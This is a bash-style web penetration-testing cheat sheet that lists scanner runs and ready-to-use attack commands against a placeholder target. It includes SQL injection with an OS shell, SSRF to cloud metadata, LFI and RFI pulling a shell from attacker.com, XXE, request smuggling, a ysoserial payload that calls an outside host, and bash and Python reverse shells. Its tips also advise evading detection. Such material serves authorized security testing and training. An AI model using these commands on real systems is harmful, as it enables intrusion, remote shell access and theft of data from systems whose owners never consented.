#!/bin/bash
# ==============================================
# ULTIMATE WEB SECURITY TESTING CHEAT SHEET
# ==============================================

# 1. AUTOMATED SCANNING
# ---------------------

# Nuclei (Template-based scanning)
nuclei -u https://target.com -t ~/nuclei-templates/ -severity critical,high -o nuclei_scan.txt
nuclei -l urls.txt -t cves/ -rate-limit 150 -c 50 -retries 3 -j -o nuclei_results.json

# Nikto (Classic web scanner)
nikto -h https://target.com -output nikto_scan.xml -Format xml -Tuning xbce -evasion 1

# 2. SSL/TLS TESTING
# ------------------
testssl.sh --openssl /usr/bin/openssl1.1 -eE -UP -s -p -h target.com:443
sslyze --certinfo=full --compression --reneg --resum --heartbleed target.com:443

# 3. CMS-SPECIFIC SCANS
# ---------------------

# WordPress
wpscan --url https://wp-site.com --api-token YOUR_TOKEN -e vp,vt,tt,cb,u -o wpscan.txt

# Joomla
joomscan -u https://joomla-site.com -ec -r -output joomla_scan.html

# 4. VULNERABILITY-SPECIFIC TESTS
# -------------------------------

# SQL Injection
sqlmap -u "https://target.com?id=1" --batch --level 5 --risk 3 --dbs
sqlmap -r request.txt --os-shell --tamper=space2comment

# XSS Testing
dalfox url 'https://target.com/search?q=test' -b your.oast.site
xsstrike -u "https://target.com" --crawl -t 20

# SSRF Testing
curl -v "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
python3 ssrfmap.py -r request.txt -p url -m portscan --lhost=attacker.com

# LFI/RFI Testing
curl "http://target.com/view?file=../../../../etc/passwd"
curl "http://target.com/load?config=http://attacker.com/shell.txt"

# Command Injection
commix -u "http://target.com/ping.php?ip=INJECT_HERE"
curl "http://target.com/submit?email=user@test.com|whoami"

# XXE Testing
curl -X POST http://target.com/xml-parser -d '<?xml version="1.0"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><test>&xxe;</test>'

# Prototype Pollution
fetch('/api/user', {method: 'POST', body: JSON.stringify({"__proto__": {"isAdmin": true}})})

# CORS Misconfig
curl -H "Origin: https://evil.com" -I https://target.com/api/user
curl -H "Origin: null" -I https://target.com/data

# CRLF Injection
curl -i "http://target.com/search?q=test%0d%0aInjected-Header:%20hacked"

# 5. HTTP REQUEST SMUGGLING
# -------------------------

# CL.TE
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG' | nc target.com 80

# TE.CL
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nSMUGG\r\n0\r\n\r\n' | nc target.com 80

# 6. DESERIALIZATION
# ------------------

# Java (ysoserial)
java -jar ysoserial.jar CommonsCollections5 'curl attacker.com' | base64

# Python pickle
python3 -c 'import pickle,os; print(pickle.dumps(os.system("id")))'

# 7. ADVANCED TOOLS
# -----------------

# ZAP Automation
zap-cli quick-scan -s all -r report.html https://target.com

# Burp Suite
java -jar burpsuite.jar --project-file=project.burp --config-file=config.json

# Metasploit
msfconsole -x "use exploit/multi/http/target_exploit; set RHOSTS target.com; run"

# 8. POST-EXPLOITATION
# --------------------

# Reverse Shells
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Privilege Escalation
sudo -l
find / -perm -4000 2>/dev/null
cat /etc/crontab

# ==============================================
# TIPS:
# 1. Always test with proper authorization
# 2. Use proxies (-proxy http://127.0.0.1:8080)
# 3. Rate limit scans to avoid detection
# 4. Chain vulnerabilities for greater impact
# ==============================================